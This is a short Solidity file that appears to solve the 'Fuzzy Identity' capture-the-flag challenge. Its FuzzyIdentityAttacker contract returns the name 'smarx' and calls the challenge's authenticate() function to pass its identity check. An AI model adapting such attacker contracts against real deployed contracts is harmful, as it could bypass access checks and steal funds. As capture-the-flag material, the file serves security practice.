// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import {FuzzyIdentityChallenge} from "@main/accounts/FuzzyIdentity.sol";

contract FuzzyIdentityAttacker {
    function name() public pure returns (bytes32) {
        return bytes32("smarx");
    }

    function attack(address challengeAddr) external {
        FuzzyIdentityChallenge(challengeAddr).authenticate();
    }
}
